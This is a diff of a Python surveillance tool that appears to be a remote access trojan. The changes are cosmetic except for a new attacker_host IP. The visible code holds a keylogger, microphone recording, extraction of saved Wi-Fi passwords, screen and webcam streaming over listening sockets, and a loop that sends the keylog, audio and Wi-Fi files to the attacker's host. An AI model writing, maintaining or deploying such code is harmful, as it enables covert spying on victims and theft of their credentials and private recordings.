@@ -19,8 +19,6 @@ import pyaudio
 import zlib
 import mss
 import cv2
-import math
-import struct
 from PIL import Image
 
 
@@ -56,7 +54,6 @@ def keylog():
     with Listener(on_press=key_handler) as listener:
         listener.join()
 
-
 def Microphone(Seconds=10, File="record.wav"):
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
@@ -80,7 +77,6 @@ def Microphone(Seconds=10, File="record.wav"):
     wf.writeframes(b''.join(frames))
     wf.close()
 
-
 def wifipass():
     with open("wifis.txt", "w", encoding="utf-8") as fichier:
         try:
@@ -98,7 +94,6 @@ def wifipass():
                     print(f"Password not found for {wifi}")
         except Exception as e:
             print(f"Failed to retrieve Wi-Fi profiles: {e}")
-
 
 def retreive_screenshot(conn):
     with mss.mss() as sct:
@@ -129,7 +124,6 @@ def retreive_screenshot(conn):
                 print(f"Error sending screen: {e}")
                 break
 
-
 def screen_sender(host='0.0.0.0', port=5001):
     with socket.socket() as sock:
         sock.bind((host, port))
@@ -139,7 +133,6 @@ def screen_sender(host='0.0.0.0', port=5001):
             conn, _ = sock.accept()
             threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
             threadscreen2.start()
-
 
 def handle_client(client_socket):
     BUFFER_SIZE = 4096
@@ -158,7 +151,6 @@ def handle_client(client_socket):
             break
     client_socket.close()
 
-
 def R_tcp(host='0.0.0.0', port=5000):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
@@ -168,7 +160,6 @@ def R_tcp(host='0.0.0.0', port=5000):
         client_socket, client_address = s.accept()
         print(f"{client_address[0]}:{client_address[1]} Connected!")
         threading.Thread(target=handle_client, args=(client_socket,)).start()
-
 
 def capturevid(conn):
     try:
@@ -268,7 +259,7 @@ if __name__ == "__main__":
         MAX_IMAGE_DGRAM = MAX_DGRAM - 64
         threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
         threadcam.start()
-    attacker_host = '192.168.1.2'
+    attacker_host = '10.10.27.93'
     file_transfer_port = options.port + 3
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
     while True:
